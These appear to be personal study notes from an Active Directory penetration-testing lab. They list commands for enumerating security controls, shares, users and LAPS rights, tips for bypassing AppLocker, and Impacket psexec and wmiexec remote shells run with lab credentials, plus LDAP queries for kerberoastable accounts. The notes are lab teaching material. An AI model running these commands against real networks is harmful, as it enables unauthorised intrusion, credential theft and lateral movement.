## Enumerating Security Controls
### Windows Defender
```powershell
Get-MpComputerStatus
```
Look For
```powershell
RealTimeProtectionEnabled : True
```
### [AppLocker](https://learn.microsoft.com/en-us/windows/security/application-security/application-control/windows-defender-application-control/applocker/what-is-applocker)
Whitelist of approved software applications or executables that are allowed to run. 
Powershell.exe and CMD.exe are often blocked. but they forget about the other locations.
`%SystemRoot%\SysWOW64\WindowsPowerShell\v1.0\powershell.exe`
or 
`PowerShell_ISE.exe`

May be able to call from another location.
**List the Rules**
```powershell
Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections
```

### PowerShell Constrained Language Mode
Locks down many of the features needed to use PowerShell effectivley, such as blocking COM objects and only allowing approved .NET types, XAML-based workflows and PowerShell classes. 
```powershell
$ExecutionContext.SessionState.LanguageMode
```
### LAPS
[Local Administrator Password Solution](https://www.microsoft.com/en-us/download/details.aspx?id=46899) used to randomise and rotate local admin passwords on Windows hosts. to prevent lateral movement. 
[LAPSToolKit](https://github.com/leoloobeek/LAPSToolkit)can be used to enumerate.

Parsing ExtendRights for all computers with LAPS enabled. Shows groups that read LAPS passwords. Often users in protected groups. 
```powershell
Find-LAPSDelegatedGroups
```

Check the rights on each computer with LAPS enabled for any groups with read access and users with "All Extended Rights". 
*Users with **All extended Rights** can read LAPS passwords and may be less protected*
```powershell
Find-AdmPwdExtendedRights
```

Search for computers that have LAPS enabled when passwords expire, and even the randomised passwords if the user has access. 
```powershell
Get-LAPSComputers
```

```
**Domain Group Enumeration**
```shell
sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 --groups

sudo crackmapexec smb 172.16.5.130 -u forend -p Klmcargo2 --loggedon-users
```
**Share Searching**

sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 --shares
```

```
Read the results:
```shell
head -n 10 /tmp/cme_spider_plus/172.16.5.5.json 
```

### #SMBMap 

```shell
 smbmap -u forend -p Klmcargo2 -d INLANEFREIGHT.LOCAL -H 172.16.5.5
```

**Recursive List of all Directories**
```shell
smbmap -u forend -p Klmcargo2 -d INLANEFREIGHT.LOCAL -H 172.16.5.5 -R 'Department Shares' --dir-only
```
### #rpcclient
Null sessions?
```bash
rpcclient -U "" -N 172.16.5.5
```
#### [RID](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/understand-security-identifiers)
##### Relative Identifier
- The [SID](https://docs.microsoft.com/en-us/windows/security/identity-protection/access-control/security-identifiers) for the INLANEFREIGHT.LOCAL domain is: `S-1-5-21-3842939050-3880317879-2865463114`.
- When an object is created within a domain, the number above (SID) will be combined with a RID to make a unique value used to represent the object.
- So the domain user `htb-student` with a RID:[0x457] Hex 0x457 would = decimal `1111`, will have a full user SID of: `S-1-5-21-3842939050-3880317879-2865463114-1111`.
- This is unique to the `htb-student` object in the INLANEFREIGHT.LOCAL domain and you will never see this paired value tied to another object in this domain or any other.

Accounts can have same RID regardless of the host. 

Administrators accounts will always have `500` or `0x1f4`
##### Query User By RID
```shell
queryuser 0x457
```
Enumerate all users 
```shell
enumdomusers
```
### #Impacket Toolkit
**Psexec.py**
Creates a remote service by uploading a randomly-named service in the ADMIN$ share on the target host. 
Registers the service via RPC and Window Service Control Manager. Once communication is established you get a remote shell as `system`
```bash
impacket-psexec inlanefreight.local/<user>:'<pass>'@172.16.5.125  
```

**wmiexec**
Commands are executed through [Windows Management Instrumentation](https://learn.microsoft.com/en-us/windows/win32/wmisdk/wmi-start-page). Does not drop any files or executables on the target host. Generates fewer logs than other modules. 
Runs as local admin user you connected with. More stealthy approach to execution on hosts than other tools. 
```bash
Impacket-wmiexec inlanefreight.local/<user>:'<pass>'@172.16.5.5  
```

**Windapsearch** 
Can use to enumerate users, groups, and computers from a windows domain utilising LDAP queries.

Domain Admins
```shell-session
Impacket-windapsearch --dc-ip 172.16.5.5 -u forend@inlanefreight.local -p Klmcargo2 --da
```
Privileged Users
```shell
windapsearch.py --dc-ip 172.16.5.5 -u forend@inlanefreight.local -p Klmcargo2 -PU
```

### #Bloodhound
Can create graphical representations of data or "attack paths"
Uses [Graph theory](https://en.wikipedia.org/wiki/Graph_theory) to visualise relationships and uncover new attack paths. 
Consists of [SharpHound](https://github.com/BloodHoundAD/BloodHound/tree/master/Collectors) collector
Can right custom queries in [Cypher Language](https://blog.cptjesus.com/posts/introtocypher/)
```shell
sudo bloodhound-python -u 'forend' -p 'Klmcargo2' -ns 172.16.5.5 -d inlanefreight.local -c all 
```

### Active Directory Power Shell Module 
Around 150 modules
**Installed**
```powershell
Import-Module ActiveDirectory
```
```powershell
Get-Module
```
**Get Domain Info**
```powershell
Get-ADDomain
```
**Get-ADUser**
```powershell
Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName
```
Filter for accounts with ServicePrincipalName property populated, this means they may be susceptible to a kerbroasting attack.

```powershell
Get-ADTrust -Filter *
```
Print Trust relationships the domain has. 
**Group Enumeration**
```powershell
Get-ADGroup -Filter * | select name
```
***Detailed Group Info***
```powershell
Get-ADGroup -Identity "Backup Operators"
```
***Group Membership***
Lists the members of a group
```powershell
Get-ADGroupMember -Identity "Backup Operators"
```

#### Dsquery
[Dsquery](<https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/cc732952(v=ws.11)>) is a command line tool to find AD objects. 
**User Search**
```powershell
dsquery user
```
**Computer Search**
```powershell
dsquery computer
```
**Wildcard Search**
```powershell
dsquery * "CN=Users,DC=INLANEFREIGHT,DC=LOCAL"
```
**Users with Specific Attributes set (PASSWD_NOTREQD)**
```powershell
dsquery * -filter "(&(objectCategory=person)(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=32))" -attr distinguishedName userAccountControl
```
**Searching for Domain Controllers**
```powershell
dsquery * -filter "(userAccountControl:1.2.840.113556.1.4.803:=8192)" -limit 5 -attr sAMAccountName
```

#### LDAP Filtering Explained
**UAC Values**
`userAccountControl:1.2.840.113556.1.4.803=8192`
=8192 represents the decimal bitmask for the UAC value.

**OID Match Strings**
Rules used to match a bit value with attributes
3 Main matching rules:
1. `1.2.840.113556.1.4.803`

the bit value must match completely to meet the search requirements. Great for matching a singular attribute.

2. `1.2.840.113556.1.4.804`

When using this rule, we are saying that we want our results to show any attribute match if any bit in the chain matches. This works in the case of an object having multiple attributes set.

3. `1.2.840.113556.1.4.1941`

This rule is used to match filters that apply to the Distinguished Name of an object and will search through all ownership and membership entries.

**Logical Operators**
Comvine multiple operators with & (and)
`(&(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=64))`
